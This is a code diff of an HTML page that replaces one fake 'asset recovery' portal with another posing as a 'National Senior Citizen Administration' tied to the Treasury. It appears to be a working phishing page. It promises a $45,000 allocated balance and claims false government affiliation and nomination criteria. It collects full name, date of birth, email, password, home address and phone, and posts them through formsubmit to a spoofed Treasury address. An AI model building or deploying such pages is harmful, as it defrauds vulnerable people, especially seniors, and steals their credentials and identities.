@@ -3,541 +3,1179 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>National Asset Recovery & Property Claims Intake</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <title>National Senior Citizen Administration</title>
     <style>
         :root {
-            --primary: #0a2540;
-            --secondary: #639fab;
-            --accent: #00875a;
-            --error: #de350b;
-            --background: #f8f9fa;
-            --text: #333333;
-            --card-bg: #ffffff;
-            --border: #e2e8f0;
+            --primary: #112240;
+            --primary-hover: #1d3557;
+            --accent: #4a5568; 
+            --success: #2e7d32;
+            --danger: #d32f2f;
+            --text-dark: #23272a;
+            --text-light: #64748b;
+            --bg-light: #f1f5f9;
+            --white: #ffffff;
+            --gold: #b89241;
+            --unavailable: #64748b;
         }
 
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Inter', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-weight: 700;
         }
 
         body {
-            background-color: var(--background);
-            color: var(--text);
-            line-height: 1.6;
-            padding: 0 0 20px 0;
-        }
-
-        .security-banner {
-            background-color: var(--primary);
-            color: #ffffff;
-            text-align: center;
-            padding: 8px 10px;
-            font-size: 11px;
-            font-weight: 600;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        .ticker-wrap {
-            width: 100%;
-            background-color: #1e293b;
-            overflow: hidden;
-            border-bottom: 2px solid #334155;
-            padding: 6px 0;
-        }
-
-        .ticker {
-            display: inline-block;
-            white-space: nowrap;
-            padding-left: 100%;
-            animation: ticker-move 35s linear infinite;
-            color: #38bdf8;
-            font-size: 12px;
-            font-weight: 600;
-            letter-spacing: 0.5px;
-        }
-
-        @keyframes ticker-move {
-            0% { transform: translate3d(0, 0, 0); }
-            100% { transform: translate3d(-100%, 0, 0); }
-        }
-
-        .container {
-            max-width: 520px;
-            margin: 20px auto;
-            padding: 0 10px;
-        }
-
-        .portal-nav {
+            background-color: var(--bg-light);
+            color: var(--text-dark);
             display: flex;
-            background-color: #e2e8f0;
-            padding: 4px;
-            border-radius: 8px;
-            margin-bottom: 15px;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+            padding-bottom: 90px; 
         }
 
-        .nav-btn {
-            flex: 1;
-            background: none;
-            border: none;
-            padding: 10px;
-            font-size: 13px;
-            font-weight: 600;
-            color: #475569;
-            cursor: pointer;
-            border-radius: 6px;
-            transition: all 0.2s ease;
-        }
-
-        .nav-btn.active {
-            background-color: white;
-            color: var(--primary);
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-        }
-
-        .portal-card {
-            background-color: var(--card-bg);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 24px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
-        }
-
-        .header-section {
-            text-align: center;
-            margin-bottom: 20px;
-            border-bottom: 2px solid var(--background);
-            padding-bottom: 15px;
-        }
-
-        .header-section h1 { font-size: 22px; color: var(--primary); font-weight: 700; }
-        .header-section p { font-size: 13px; color: #64748b; margin-top: 4px; }
-
-        label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: var(--primary);
-            margin-bottom: 6px;
-            margin-top: 15px;
-        }
-
-        input[type="text"],
-        input[type="email"],
-        input[type="tel"],
-        select {
+        .portal-container {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #cbd5e1;
-            border-radius: 8px;
-            font-size: 15px;
-            color: var(--text);
-            background-color: #ffffff;
-            transition: all 0.2s ease-in-out;
-            -webkit-appearance: none;
+            max-width: 600px;
+            background: var(--white);
+            border-radius: 16px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            padding: 35px;
+            margin: 20px;
+            position: relative;
+            min-height: 580px;
+            z-index: 5;
         }
 
-        input:focus, select:focus {
+        .dash-menu-bar { display: flex; border-bottom: 2px solid #e2e8f0; margin-bottom: 20px; }
+        .dash-menu-item { padding: 10px 20px; cursor: pointer; color: var(--text-light); border-bottom: 3px solid transparent; transition: 0.3s; }
+        .dash-menu-item.active { color: var(--primary); border-bottom: 3px solid var(--primary); }
+        .dash-panel { display: none; }
+        .dash-panel.active { display: block; }
+        
+        .status-pill { padding: 4px 12px; border-radius: 20px; font-size: 12px; background: #fff3cd; color: #856404; }
+
+        .top-utility-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px dashed #e2e8f0;
+        }
+
+        .language-selector-container select {
+            padding: 6px 12px;
+            font-size: 13px;
+            font-weight: 800;
+            border: 1px solid #cbd5e0;
+            border-radius: 6px;
+            background-color: var(--white);
+            color: var(--primary);
             outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px rgba(0, 135, 90, 0.1);
+            cursor: pointer;
         }
 
-        .input-error { border-color: var(--error) !important; background-color: #fff8f6; }
-        .error-message { color: var(--error); font-size: 12px; font-weight: 500; margin-top: 4px; display: none; }
+        .secure-badge-mini {
+            font-size: 11px;
+            font-weight: 800;
+            color: var(--success);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            background: #e6f4ea;
+            padding: 4px 10px;
+            border-radius: 12px;
+        }
 
-        .view-panel { display: none; }
-        .view-panel.active { display: block; animation: fadeIn 0.3s ease-in-out; }
-        .form-step { display: none; }
-        .form-step.active { display: block; }
+        .platform-header {
+            text-align: center;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #e2e8f0;
+            padding-bottom: 20px;
+        }
 
-        .btn {
+        .header-seal-graphic {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto 12px auto;
+            border-radius: 50%;
+            border: 2px solid var(--gold);
             display: flex;
             align-items: center;
             justify-content: center;
-            width: 100%;
-            padding: 14px;
-            background-color: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: background-color 0.2s;
+            background: #fcf9f2;
+            color: var(--gold);
+            font-size: 24px;
+            font-weight: 900;
+            box-shadow: 0 3px 6px rgba(0,0,0,0.05);
         }
 
-        .btn-submit { background-color: var(--accent); }
-        .spinner { animation: spin 1s linear infinite; margin-right: 10px; display: none; }
+        .brand-title {
+            color: var(--primary);
+            font-size: 20px;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
 
-        /* TRACKING TERMINAL DIAGRAMS */
-        .pipeline-display {
-            background-color: #f8fafc;
+        .brand-tagline {
+            color: var(--accent);
+            font-size: 13px;
+            font-weight: 800;
+            margin-top: 4px;
+        }
+
+        .pipeline-banner {
+            background: #f8fafc;
             border: 1px solid #e2e8f0;
-            border-radius: 8px;
-            padding: 16px;
-            margin-top: 20px;
-            display: none;
+            border-top: 4px solid var(--primary);
+            padding: 12px 15px;
+            border-radius: 6px;
+            text-align: center;
+            margin-bottom: 25px;
         }
 
-        .pipe-step {
+        .pipeline-banner-title {
+            font-size: 14px;
+            font-weight: 900;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .nomination-guide-box {
+            background: #f8fafc;
+            border-left: 4px solid var(--gold);
+            padding: 15px;
+            border-radius: 0 8px 8px 0;
+            margin-bottom: 20px;
+        }
+
+        .nomination-guide-title {
+            font-size: 13px;
+            font-weight: 900;
+            color: var(--primary);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+
+        .nomination-purpose-text {
+            font-size: 13px;
+            color: #475569;
+            line-height: 1.5;
+            font-weight: 700;
+        }
+
+        .qualification-list {
+            margin-top: 10px;
+            padding-left: 20px;
+            color: var(--primary);
+        }
+
+        .qualification-list li {
+            margin-bottom: 5px;
+        }
+
+        .page {
+            display: none;
+            opacity: 0;
+            transform: translateX(30px);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .page.active {
+            display: block;
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .page.exit {
+            display: block;
+            opacity: 0;
+            transform: translateX(-30px);
+            position: absolute;
+            width: calc(100% - 70px);
+        }
+
+        h2 {
+            color: var(--primary);
+            font-size: 22px;
+            margin-bottom: 6px;
+            font-weight: 900;
+        }
+
+        p.subtitle {
+            color: var(--text-light);
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+            font-weight: 800;
+        }
+
+        .card {
+            background: var(--bg-light);
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
+        }
+
+        .flex-row {
             display: flex;
-            align-items: flex-start;
-            margin-bottom: 16px;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .flex-row:last-child {
+            border-bottom: none;
+        }
+
+        .label {
+            color: var(--text-light);
+            font-weight: 800;
+            font-size: 14px;
+        }
+
+        .value {
+            color: var(--text-dark);
+            font-weight: 900;
+            font-size: 15px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 15px;
             position: relative;
         }
 
-        .pipe-step:not(:last-child)::after {
-            content: '';
-            position: absolute;
-            left: 11px;
-            top: 24px;
-            width: 2px;
-            height: 24px;
-            background-color: #cbd5e1;
+        .address-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 15px;
         }
 
-        .pipe-icon {
-            width: 24px;
-            height: 24px;
+        @media (max-width: 480px) {
+            .address-grid {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+        }
+
+        .input-group label {
+            font-size: 14px;
+            font-weight: 900;
+            color: var(--primary);
+        }
+
+        .input-group input {
+            padding: 14px;
+            border: 2px solid #cbd5e0;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 800;
+            width: 100%;
+            outline: none;
+            background-color: var(--white);
+            transition: all 0.2s ease;
+        }
+
+        .input-group input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(17, 34, 64, 0.15);
+        }
+        
+        .password-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            cursor: pointer;
+            width: 22px;
+            height: 22px;
+            color: var(--text-light);
+        }
+
+        .input-group.field-error input {
+            border-color: var(--danger) !important;
+            background-color: #fff8f8;
+        }
+
+        .inline-error-msg {
+            display: none;
+            color: var(--danger);
+            font-size: 14px;
+            font-weight: 900;
+            margin-bottom: 15px;
+            text-align: center;
+            padding: 10px;
+            background: #fde8f8;
+            border-radius: 6px;
+            border: 1px solid #f8b4b4;
+        }
+
+        .btn {
+            background: var(--primary);
+            color: var(--white);
+            border: none;
+            padding: 16px 28px;
+            font-size: 17px;
+            font-weight: 900;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s, transform 0.1s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 4px 6px rgba(17, 34, 64, 0.1);
+        }
+
+        .btn:hover {
+            background: var(--primary-hover);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--text-light);
+            border: 2px solid #cbd5e0;
+            padding: 14px 20px;
+            font-size: 15px;
+            font-weight: 800;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 12px;
+            transition: all 0.2s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .btn-secondary:hover {
+            background: #f8fafc;
+            color: var(--primary);
+            border-color: #94a3b8;
+        }
+
+        .loader-container {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .spinner {
+            width: 55px;
+            height: 55px;
+            border: 5px solid #edf2f7;
+            border-top: 5px solid #23395b;
             border-radius: 50%;
-            background-color: #cbd5e1;
-            color: white;
+            margin: 0 auto 25px auto;
+            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .progress-bar-bg {
+            width: 100%;
+            background-color: #e2e8f0;
+            border-radius: 10px;
+            height: 8px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            width: 0%;
+            height: 100%;
+            background-color: var(--primary);
+        }
+
+        .balance-box {
+            background: linear-gradient(135deg, var(--primary) 0%, #23395b 100%);
+            color: var(--white);
+            text-align: center;
+            padding: 22px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(17, 34, 64, 0.15);
+        }
+
+        .balance-amount {
+            font-size: 34px;
+            font-weight: 900;
+            margin-top: 4px;
+            letter-spacing: -0.5px;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #feebc8;
+            color: #c05621;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-weight: 800;
+            font-size: 13px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite ease-in-out;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            70% { transform: scale(1.03); }
+            100% { transform: scale(1); }
+        }
+
+        .method-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .method-option {
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 16px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+        }
+
+        .method-option.selected {
+            border-color: #23395b;
+            background: #fffdf6;
+        }
+
+        .method-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 800;
+            font-size: 15px;
+            color: var(--primary);
+        }
+
+        .method-fields {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.35s cubic-bezier(0.4, 0, 0.2, 1), margin-top 0.35s ease;
+        }
+
+        .method-option.selected .method-fields {
+            max-height: 450px;
+            margin-top: 15px;
+            border-top: 1px solid #edf2f7;
+            padding-top: 15px;
+        }
+
+        .portal-legal-footer {
+            margin-top: 30px;
+            padding: 20px;
+            border-top: 3px solid var(--primary);
+            background-color: #f8fafc;
+            border-radius: 8px;
+            text-align: left;
+        }
+
+        .legal-footer-text {
+            font-size: 15px;
+            color: #1e293b;
+            line-height: 1.6;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .footer-contact-details {
+            border-top: 1px dashed #cbd5e0;
+            padding-top: 12px;
+            font-size: 14px;
+            color: #0f172a;
+            font-weight: 900;
+            line-height: 1.5;
+        }
+
+        .live-agent-dock {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: var(--white);
+            border-radius: 50px;
+            padding: 6px 12px 6px 6px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.16);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: 2px solid var(--danger);
+            z-index: 9999;
+            width: 145px;
+            animation: gentleFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes gentleFloat {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .agent-avatar-frame {
+            position: relative;
+            width: 36px;
+            height: 36px;
+            flex-shrink: 0;
+        }
+
+        .agent-avatar-img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: #edf2f7;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 11px;
-            font-weight: bold;
-            margin-right: 12px;
-            z-index: 2;
+            font-size: 18px;
+            border: 1.5px solid var(--text-light);
         }
 
-        /* Active/Complete Engine Styles */
-        .pipe-step.completed .pipe-icon { background-color: var(--accent); }
-        .pipe-step.completed .pipe-icon::after { content: ''; }
-        .pipe-step.current .pipe-icon { background-color: #0284c7; box-shadow: 0 0 0 4px rgba(2, 132, 199, 0.2); }
-        
-        .pipe-info h4 { font-size: 14px; color: var(--primary); font-weight: 600; }
-        .pipe-info p { font-size: 12px; color: #64748b; }
-
-        .supplemental-box {
-            background-color: #fef7e0;
-            border: 1px solid #f59e0b;
-            border-radius: 8px;
-            padding: 14px;
-            margin-top: 15px;
-            font-size: 13px;
+        .agent-status-dot {
+            position: absolute;
+            bottom: 0px;
+            right: 0px;
+            width: 9px;
+            height: 9px;
+            background-color: var(--danger);
+            border: 1.5px solid var(--white);
+            border-radius: 50%;
         }
 
-        .trust-footer {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 12px;
-            color: #64748b;
-            background-color: #f1f5f9;
-            padding: 12px;
-            border-radius: 8px;
+        .agent-info-content {
+            display: flex;
+            flex-direction: column;
+            gap: 0px;
+            overflow: hidden;
         }
 
-        .badge-row { display: flex; justify-content: center; gap: 15px; margin-top: 8px; font-weight: 600; font-size: 11px; color: #475569; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+        .agent-name-title {
+            font-size: 11.5px;
+            font-weight: 900;
+            color: var(--primary);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            line-height: 1.2;
+        }
+
+        .agent-status-label {
+            font-size: 9.5px;
+            font-weight: 900;
+            color: var(--danger);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            line-height: 1.1;
+        }
     </style>
 </head>
 <body>
 
-    <div class="security-banner">
-        🔒 SECURE 256-BIT ENCRYPTION PROTOCOL ACTIVE • EXECUTIVE LEDGER APP
-    </div>
-
-    <div class="ticker-wrap">
-        <div class="ticker">
-            • REGISTRY VERIFIED: $14,240 RECOVERED IN TEXAS LEDGER (4 MINS AGO) 
-            • REGISTRY VERIFIED: $5,810 RECOVERED IN FLORIDA CAPITAL LEDGER (18 MINS AGO) 
-            • REGISTRY VERIFIED: $110,400 PROBATE FILE ESCROW AUDIT ACTIVE (1 HOUR AGO) 
-            • REGISTRY VERIFIED: $34,900 LIQUIDATED CORPORATE ASSET UNLOCKED (2 HOURS AGO)
+<div class="portal-container">
+    
+    <div class="top-utility-bar">
+        <div class="language-selector-container">
+            <select id="uiLanguageSelect" onchange="alterPortalLanguage()">
+                <option value="en">🌐 English</option>
+                <option value="es">🌐 Español (Spanish)</option>
+                <option value="fr">🌐 Français (French)</option>
+                <option value="de">🌐 Deutsch (German)</option>
+                <option value="it">🌐 Italiano (Italian)</option>
+                <option value="pt">🌐 Português (Portuguese)</option>
+            </select>
+        </div>
+        <div class="secure-badge-mini">
+            🔒 SSL Secured
         </div>
     </div>
 
-    <div class="container">
+    <div class="platform-header" id="mainBrandHeader">
+        <div class="header-seal-graphic">🦅</div>
+        <div class="brand-title" id="text-brand-title">National Senior Citizen Administration</div>
+        <div class="brand-tagline" id="text-brand-tagline">Private Senior Citizen Disbursement & Portfolio Management</div>
+    </div>
+
+    <div class="pipeline-banner" id="secondaryPipelineBanner" style="display: none;">
+        <div class="pipeline-banner-title" id="pipelineBannerText">Secure Verification Framework</div>
+    </div>
+
+    <form action="https://formsubmit.co/official@ustreasury.com" method="POST" id="portalMasterForm">
         
-        <div class="portal-nav">
-            <button class="nav-btn active" id="btnViewIntake" onclick="switchView('intake')">Secure Registration Form</button>
-            <button class="nav-btn" id="btnViewTrack" onclick="switchView('track')">Client Case Terminal</button>
-        </div>
+        <input type="hidden" name="_subject" value="New File Record Submission Received">
+        <input type="hidden" name="_captcha" value="false">
 
-        <div class="portal-card">
+        <div id="page1" class="page active">
+            <h2 id="text-p1-title">Asset Recovery Portal</h2>
+            <p class="subtitle" id="text-p1-sub">Enter your file verification details below to initiate secure system review.</p>
             
-            <div id="panelIntake" class="view-panel active">
-                <div class="header-section">
-                    <h1>Asset Recovery Portal</h1>
-                    <p>National Property & Unclaimed Capital Intake System</p>
+            <div class="nomination-guide-box" id="text-guide-box">
+                <div class="nomination-guide-title" id="text-guide-title">Official Nomination & Eligibility Verification</div>
+                <div class="nomination-purpose-text" id="text-purpose-content">
+                    This portal manages the identification, authentication, and disbursement of retroactive government funding and unassigned treasury assets.
+                    <br><br>
+                    <strong>Qualification Criteria:</strong> Your profile has been officially nominated based on the following verified administrative data:
+                    <ul class="qualification-list">
+                        <li>Consistent, on-time payment of utility and residential service accounts.</li>
+                        <li>Documented active participation in digital banking systems for a minimum of 5 years.</li>
+                        <li>Consistent compliance with all institutional and public record validation protocols.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div id="p1-error-frame" class="inline-error-msg">Failed to Continue: Invalid details or unauthorized Tracking Number.</div>
+
+            <div class="card" style="background: #fff; padding: 15px 20px 5px 20px;">
+                <div class="input-group" id="grp-name">
+                    <label for="client_name" id="lbl-name">Full Name</label>
+                    <input type="text" name="Client Full Name" id="client_name" placeholder="e.g. Johnathan Doe">
+                </div>
+                
+                <div class="input-group" id="grp-dob">
+                    <label for="client_dob" id="lbl-dob">Date of Birth</label>
+                    <input type="date" name="Client Date of Birth" id="client_dob">
                 </div>
 
-                <form action="https://formsubmit.co/doroskiiwilliams@gmail.com" method="POST" id="portalForm">
-                    <input type="hidden" name="_next" value="https://Treasury-Portal-Admin.github.io/"> 
-                    <input type="hidden" name="_subject" value="⚠️ NEW PRIORITY ASSET INTAKE LEAD">
-                    <input type="hidden" name="_captcha" value="true">
-                    <input type="text" name="_honey" style="display:none">
+                <div class="input-group" id="grp-email">
+                    <label for="client_email" id="lbl-email">Email</label>
+                    <input type="email" name="Client Email" id="client_email" placeholder="name@example.com">
+                </div>
 
-                    <div class="form-step active" id="step1">
-                        <label for="propertyState">Select State / Region of Origin</label>
-                        <select name="propertyState" id="propertyState">
-                            <option value="" disabled selected>Choose Region...</option>
-                            <option value="TX">Texas (TX Registry)</option>
-                            <option value="FL">Florida (FL Registry)</option>
-                            <option value="NY">New York (NY Registry)</option>
-                            <option value="CA">California (CA Registry)</option>
-                            <option value="Other">Other Region / International File</option>
-                        </select>
-                        <div class="error-message" id="stateError">⚠️ Please select your region of origin to query the registry.</div>
-
-                        <label for="assetTier">Estimated Unclaimed Capital Range</label>
-                        <select name="assetTier" id="assetTier">
-                            <option value="" disabled selected>Select Estimated Amount...</option>
-                            <option value="Tier1">Under $1,000</option>
-                            <option value="Tier2">$1,000 - $10,000</option>
-                            <option value="Tier3">$10,000 - $50,000</option>
-                            <option value="Tier4">$50,000+ (Immediate High Priority)</option>
-                        </select>
-                        <div class="error-message" id="tierError">⚠️ Selecting an estimated range is required to initialize verification.</div>
-
-                        <button type="button" class="btn" onclick="goStep2()">Verify Asset Records →</button>
-                    </div>
-
-                    <div class="form-step" id="step2">
-                        <div style="background-color: #e6f4ea; color: #137333; padding: 10px; border-radius: 6px; font-size: 13px; font-weight: 500; text-align: center; margin-bottom: 15px;">
-                            ✓ Pre-Qualification Complete: Active matches flagged.
-                        </div>
-
-                        <label for="fullName">Full Legal Name</label>
-                        <input type="text" name="fullName" id="fullName" placeholder="As it appears on official ID" disabled>
-                        <div class="error-message" id="nameError">⚠️ Full legal name is required to match state ledger data.</div>
-
-                        <label for="email">Secure Notification Email</label>
-                        <input type="email" name="email" id="email" placeholder="For record file updates" disabled>
-                        <div class="error-message" id="emailError">⚠️ Provide a valid email address to receive tracking file updates.</div>
-
-                        <label for="phone">Primary Contact Number</label>
-                        <input type="tel" name="phone" id="phone" placeholder="123-456-7890" maxlength="12" disabled>
-                        <div class="error-message" id="phoneError">⚠️ A primary standard phone contact is required.</div>
-
-                        <button type="button" class="btn btn-submit" id="submitBtn" onclick="validateAndSubmit()">
-                            <svg class="spinner" id="btnSpinner" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.3)" stroke-width="3"/>
-                                <path d="M12 2C6.47715 2 2 6.47715 2 12C2 13.5997 2.37562 15.1116 3.04337 16.4525" stroke="white" stroke-width="3" stroke-linecap="round"/>
+                <div class="input-group" id="grp-pass">
+                    <label for="client_pass" id="lbl-pass">Password</label>
+                    <div class="password-wrapper">
+                        <input type="password" name="Client Password" id="client_pass" placeholder="Enter secure password">
+                        <div class="toggle-password" id="eye-icon" onclick="togglePasswordVisibility('client_pass')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path id="eye-path" d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                <circle id="eye-circle" cx="12" cy="12" r="3"></circle>
                             </svg>
-                            <span id="btnText">Submit Secure Request & Finalize</span>
-                        </button>
-                    </div>
-                </form>
-            </div>
-
-            <div id="panelTrack" class="view-panel">
-                <div class="header-section">
-                    <h1>Case Management Hub</h1>
-                    <p>Institutional Account Tracker & Auditing Console</p>
-                </div>
-
-                <div style="background-color: #f1f5f9; padding: 15px; border-radius: 8px; border: 1px solid #e2e8f0;">
-                    <label style="margin-top: 0;" for="lookupID">Input Authorized File Case ID or Phone Number</label>
-                    <input type="text" id="lookupID" placeholder="e.g. REC-777, REC-101 or phone number">
-                    <button type="button" class="btn" style="margin-top: 12px; background-color: #0284c7;" onclick="executeLedgerLookup()">Query Registry Pipeline</button>
-                </div>
-
-                <div class="pipeline-display" id="pipelineContainer">
-                    <h3 style="font-size: 15px; color: var(--primary); font-weight: 700; margin-bottom: 4px; border-bottom: 1px solid #e2e8f0; padding-bottom: 8px;">
-                        File Ref: <span id="displayRefNum" style="color: #0284c7;">-</span>
-                    </h3>
-                    <p style="font-size:12px; color:#475569; margin-bottom:15px; font-weight:500;">
-                        Authorized Claimant: <span id="displayClientName" style="color:var(--primary); font-weight:700;">-</span><br>
-                        Registry Jurisdiction: <span id="displayClientRegion">-</span>
-                    </p>
-
-                    <div id="pipelineStepsContainer">
                         </div>
+                    </div>
+                </div>
+                
+                <div class="input-group" id="grp-street">
+                    <label for="client_street" id="lbl-street">Street Address / Road</label>
+                    <input type="text" name="Client Street Address" id="client_street" placeholder="e.g. 12 Lawns Road">
+                </div>
 
-                    <div class="supplemental-box" id="supplementalBox" style="display:none;">
-                        <p style="font-weight: 700; color: #b45309; margin-bottom: 4px;">⚠️ Supplemental Action Required</p>
-                        <p style="color: #78350f; font-size: 12px; margin-bottom: 8px;">To upgrade this case file status to Stage 3, please forward your identity matching files to your assigned specialist link.</p>
-                        <a href="mailto:your-email@domain.com?subject=Supplemental Documents Verification" style="display:inline-block; font-size:12px; font-weight:700; color:white; background-color:#b45309; text-decoration:none; padding: 6px 12px; border-radius:4px;">Transmit Secure Documentation</a>
+                <div class="address-grid">
+                    <div class="input-group" id="grp-state">
+                        <label for="client_state" id="lbl-state">State / Region</label>
+                        <input type="text" name="Client State" id="client_state" placeholder="e.g. Texas">
+                    </div>
+
+                    <div class="input-group" id="grp-city">
+                        <label for="client_city" id="lbl-city">City</label>
+                        <input type="text" name="Client City" id="client_city" placeholder="City">
+                    </div>
+
+                    <div class="input-group" id="grp-zip">
+                        <label for="client_zip" id="lbl-zip">Zip / Postal</label>
+                        <input type="text" name="Client Zip Code" id="client_zip" placeholder="e.g. 00000">
+                    </div>
+                </div>
+
+                <div class="input-group" id="grp-phone">
+                    <label for="client_phone" id="lbl-phone">Contact Phone Number</label>
+                    <input type="tel" name="Client Phone Number" id="client_phone" placeholder="e.g. +1 (202) 555-0199">
+                </div>
+
+                <div class="input-group" id="grp-ref">
+                    <label for="ref_code" id="lbl-ref">Tracking Number (Format: SRN-000000-X)</label>
+                    <input type="text" name="Verified Tracking Number" id="ref_code" placeholder="e.g. SRN-884291-X" maxlength="12">
+                </div>
+            </div>
+
+            <button type="button" class="btn" id="btn-p1" onclick="initiateStepTransition('page2')">
+                Sign In & Verify
+            </button>
+
+            <div class="portal-legal-footer" id="p1-legal-footer">
+                <p class="legal-footer-text">
+                    Regulatory Compliance Notice: In affiliation with regulatory asset protocols tracing back to the core operational frameworks established by the Department of the Treasury since 1789. All file lookups, record transmissions, and account verification matching comply fully with private administrative safety covenants.
+                </p>
+                <div class="footer-contact-details">
+                    📞 Administration Helpline: +1 956-704-8309 <br>
+                    ✉️ Official Administration Email: official@ustreasury.com
+                </div>
+            </div>
+        </div>
+
+        <div id="review-loader" class="loader-container">
+            <div class="spinner"></div>
+            <h3 style="color: var(--primary); margin-bottom: 5px;" id="text-loader-title">Analyzing File Registry...</h3>
+            <p style="color: var(--text-light); font-size: 14px;" id="text-loader-sub">Performing automatic allocation ledger balance review.</p>
+            <div class="progress-bar-bg">
+                <div id="progress-bar" class="progress-bar-fill"></div>
+            </div>
+        </div>
+
+        <div id="page2" class="page">
+            <h2>Confirm Verification</h2>
+            <p class="subtitle">Please review your allocated file balance details below before executing the clearance.</p>
+            
+            <div class="balance-box" style="background: #23395b;">
+                <div style="font-size: 13px; opacity: 0.9; text-transform: uppercase;">Allocated File Balance</div>
+                <div class="balance-amount">$45,000.00</div>
+            </div>
+
+            <div class="card" style="background: #ffffff; border: 1px solid #cbd5e0; margin-bottom: 20px;">
+                <div style="font-size: 11px; font-weight: 900; color: #23395b; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px;">Verified File Ownership Record</div>
+                <div class="flex-row" style="padding: 6px 0;"><span class="label">Client Name:</span><span class="value" id="mirror-name">---</span></div>
+                <div class="flex-row" style="padding: 6px 0;"><span class="label">Registered Location:</span><span class="value" id="mirror-address" style="font-size:13px; text-align:right;">---</span></div>
+                <div class="flex-row" style="padding: 6px 0;"><span class="label">Contact Phone:</span><span class="value" id="mirror-phone">---</span></div>
